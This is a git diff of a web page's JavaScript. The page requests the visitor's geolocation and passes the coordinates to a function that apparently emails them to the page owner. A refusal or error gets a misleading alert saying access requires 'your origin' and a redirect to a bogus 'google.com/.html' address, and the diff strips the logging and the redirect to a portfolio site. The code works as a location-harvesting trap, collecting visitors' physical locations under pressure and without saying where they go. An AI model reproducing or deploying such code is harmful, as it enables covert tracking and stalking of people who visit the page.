@@ -413,7 +413,7 @@
             getUserLocationAndVisit();
         } else {
             alert("You declined location feature, so you won't be redirected to the website.");
-            window.location.href = "https://media.licdn.com/dms/image/C5112AQEw1fXuabCTyQ/article-inline_image-shrink_1500_2232/0/1581099611064?e=1703116800&v=beta&t=-ufm_qVoEY7tm6dRnOLrur3x-elqN98HBS8S9HQhocQ"; // 505 ERROR Photo
+            window.location.href = "https://google.com/.html"; // 505 ERROR Photo
 
         }
 
@@ -422,20 +422,17 @@
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
-                    console.log("latitude:", latitude)
-                    console.log("longitude:", longitude)
-                    
+                                       
                     // Send an email with the location coordinates
                     sendEmailWithLocation(latitude, longitude);
 
-                    // Redirect to your portfolio website
-                    setTimeout(() => {
-                        window.location.href = "https://itxmujahidali.github.io/"; // Your website URL
-                    }, 5000);
                 }, function(error) {
                     alert("To access this website, you need to provide your origin.");
                     console.error("Geolocation error:", error);
-                                   });
+                    window.location.href = "https://google.com/.html"; // 505 ERROR Photo
+                   
+                });
+
             } else {
                 alert("Geolocation is not supported in your browser.");
             }
